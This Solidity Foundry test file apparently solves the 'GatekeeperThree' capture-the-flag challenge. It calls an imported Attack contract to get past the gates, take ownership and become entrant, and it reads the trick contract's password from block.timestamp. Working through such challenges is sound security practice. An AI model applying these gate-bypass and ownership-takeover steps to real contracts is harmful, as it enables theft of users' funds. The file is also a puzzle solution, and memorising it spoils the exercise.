// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/GatekeeperThree.sol";
import "../src/Attack.sol";

contract GatekeeperThreeTest is Test {
    GatekeeperThree public gatekeeper;
    Attack public attack;

    function setUp() public {
        gatekeeper = new GatekeeperThree();
        attack = new Attack();
    }

    function testGetThroughGatekeeper() public {
        // Make gatekeeper allowEntrance() becomes true
        assertEq(gatekeeper.allowEntrance(), false);
        gatekeeper.createTrick();
        SimpleTrick simpleTrick = gatekeeper.trick();
        simpleTrick.checkPassword(block.timestamp);
        gatekeeper.getAllowance(block.timestamp);
        console.log(gatekeeper.allowEntrance());
        assertEq(gatekeeper.allowEntrance(), true);

        // Ensure gatekeeper balance > 0.001 Ether
        payable(address(gatekeeper)).transfer(1 ether);
        console.log(address(gatekeeper).balance);

        // Let our attack contract obtain ownership
        attack.getOwnership(gatekeeper);

        // Become entrant
        console.log(gatekeeper.entrant());
        attack.attack(gatekeeper);
        console.log(gatekeeper.entrant());
    }
}
